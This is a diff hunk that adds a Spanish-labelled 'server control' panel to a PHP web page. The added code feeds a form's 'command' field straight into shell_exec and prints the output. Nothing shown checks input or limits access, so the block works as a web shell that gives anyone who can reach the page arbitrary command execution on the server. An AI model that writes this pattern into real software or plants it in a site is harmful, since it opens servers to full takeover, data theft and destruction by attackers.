@@ -35,6 +35,39 @@
     </ol>
 </nav>
 
+<div class="container">
+    <form action="index.php" method="post" enctype="multipart/form-data">
+
+    <div class="card text-center">
+  <div class="card-header">
+    <b>Ejecutar Acciones</b><br>
+  </div>
+  <div class="card-body">
+    <h5 class="card-title">Control del Servidor</h5>
+    <p class="card-text">
+    <label for="validationServer01">Shell</label>
+                <input type="text" name="command" value="" class="form-control" 
+                        id="validationServer01" aria-describedby="validationServer01Feedback" required>
+                <div id="validationServer01Feedback" class="invalid-feedback">
+                </div>
+                <button value="btnIniciar" class="btn btn-success" type="submit" name="accion"><i class="fas fa-play"></i> Iniciar</button>
+    <div class="form-group">
+    <?php 
+    $command = $_POST['command'];
+    echo "<pre>";
+    echo shell_exec($command);
+    echo "</pre>";   
+    ?>
+    </div>
+    </p>
+  </div>
+  <div class="card-footer text-muted">
+  Consola Shell
+  </div>
+</div>
+</div>
+
+
 
 <div class="container">
       <div class="section">
